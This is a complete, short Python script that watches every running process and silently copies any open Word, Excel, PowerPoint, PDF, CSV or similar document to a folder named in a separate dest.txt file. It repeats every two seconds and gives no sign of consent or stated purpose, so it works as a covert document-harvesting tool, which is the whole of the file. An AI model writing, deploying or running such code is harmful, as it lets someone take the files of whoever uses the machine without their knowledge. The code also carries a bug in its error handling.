import psutil
import traceback
import shutil
import pathlib
import time
import codecs

dest = codecs.open("dest.txt")
destination = dest.read()
dest.close()
suffix = [".docx",".doc",".xls",".xlsx",".rtf",".pdf",".xlsm",".csv",".ppt",".pptx",".enbx"]

while True:
    pids = psutil.pids()
    for i in pids:
        try:
            process = psutil.Process(pid=i)
            files = process.open_files()
        except:
            print("[E] Failed to get a list of opened files. Pid:",str(i) + ".")
            #traceback.print_exc()
        for j in files:
            for k in suffix:
                if j.path.endswith(k):
                    source = pathlib.Path(j.path)
                    path = pathlib.Path(destination + source.name)
                    if path.exists():
                        print("pass")
                    else:
                        try:
                            shutil.copy(j.path,destination)
                            print("copied")
                        except:
                            pass
                    print(j)
    time.sleep(2)
